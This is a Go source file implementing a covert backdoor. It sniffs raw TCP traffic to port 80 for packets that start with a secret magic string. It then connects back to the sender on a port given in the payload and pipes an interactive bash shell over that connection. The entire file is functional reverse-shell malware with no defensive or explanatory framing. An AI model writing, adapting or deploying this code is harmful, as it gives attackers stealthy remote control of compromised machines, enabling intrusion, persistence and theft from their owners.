package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"syscall"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// MagicNumber Listen to packets whose payload starts with this number
var MagicNumber = "xVUOcOIljRTgY2MWMK0piQ=="

func main() {
	var wg sync.WaitGroup

	wg.Add(1)
	go listen(80, &wg)
	wg.Wait()
}

func listen(port layers.TCPPort, wg *sync.WaitGroup) {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		log.Fatalf("Faild to open raw socket: %s", err)
	}
	f := os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd))
	defer f.Close()

	for {
		ipBuf := make([]byte, 1024)
		numRead, err := f.Read(ipBuf)
		if err != nil {
			log.Printf("Failed to read from socket: %s", err)
			continue
		}
		packet := gopacket.NewPacket(ipBuf[:numRead], layers.LayerTypeIPv4, gopacket.Default)

		if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
			tcp, _ := tcpLayer.(*layers.TCP)
			if tcp.DstPort == port {
				payload := string(tcp.Payload)
				if strings.HasPrefix(payload, MagicNumber) {
					go handlePacket(packet)
				}
			}
		}
	}
}

func handlePacket(packet gopacket.Packet) {
	ip, success := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
	if !success {
		log.Printf("Failed to get IP layer")
		return
	}
	tcp, success := packet.Layer(layers.LayerTypeTCP).(*layers.TCP)
	if !success {
		log.Printf("Failed to get TCP layer")
		return
	}
	host := ip.SrcIP.String()
	port := strings.TrimSpace(strings.TrimPrefix(string(tcp.Payload), MagicNumber))
	if _, err := strconv.Atoi(port); err != nil {
		log.Printf("Failed to convert to port: %s", port)
		return
	}
	addr := net.JoinHostPort(host, port)
	runReverseShell(addr)
}

func runReverseShell(addr string) {
	log.Printf("Connection to %s...", addr)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		log.Printf("Failed to open connection: %s", err)
	}
	defer conn.Close()
	if conn != nil {
		shellCmd := exec.Command("/bin/bash", "-i", "-c", "script /dev/null")
		shellCmd.Stdin = conn
		shellCmd.Stdout = conn
		shellCmd.Stderr = conn
		shellCmd.Run()
		log.Printf("Closing connection to %s...", addr)
	}
}
